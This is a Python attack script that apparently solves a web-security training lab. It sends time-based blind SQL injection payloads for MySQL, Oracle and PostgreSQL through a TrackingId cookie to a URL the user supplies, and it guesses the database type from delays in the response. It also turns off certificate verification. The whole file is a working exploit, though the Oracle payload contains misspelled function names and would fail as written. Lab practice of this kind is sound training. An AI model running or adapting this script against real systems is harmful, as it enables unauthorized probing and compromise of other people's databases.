import requests
import sys
import urllib3
import urllib
import click
import time
import colorama
from colorama import init, Fore


# Disable warnings generated from HTTP requests to servers with unverified SSL certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies={'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}

def injection(url):
    payloads={
              "MySQL" : "' || (SELECT SLEEP(10))--",
              "Oracle" : "' || (dmbs_pipe.recieve_message(('a'),10))--",
              "PostgreSQL" : "' || (SELECT pg_sleep(10))--"
              }
    
    
    for key, value in payloads.items():
        
        payload_encoded = urllib.parse.quote(value)
        cookies={'TrackingId':'' + payload_encoded, 'session':'null'}
        r=requests.get(url,cookies=cookies,verify=False)
        
        response_time = int(r.elapsed.total_seconds())
        
        if int(response_time) >= 10:
            print(Fore.GREEN+'\n[+] The target is vulnerable!')
            print(Fore.GREEN+f'[+] Database type is {key}')
            print(Fore.GREEN+f'[+] It took around {response_time}s to get a response')
            print(Fore.GREEN+f'[+] payload used: {value}')
            print(Fore.GREEN+'[+] Lab successfully solved')
        else:
            print(Fore.RED+f'[-] Dtabase type is NOT {key}')
            time.sleep(1)
        



@click.command()
@click.option('-u','--url',type=str, prompt="The URL of the target",required=True,help="The URL of the vulnerable target")
def main(url):
    print(Fore.YELLOW+f"[*] Attacking {url}")
    time.sleep(1)
    print(Fore.YELLOW+"[*] Checking database type...\n")
    
    injection(url)
    
    
    

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting program...")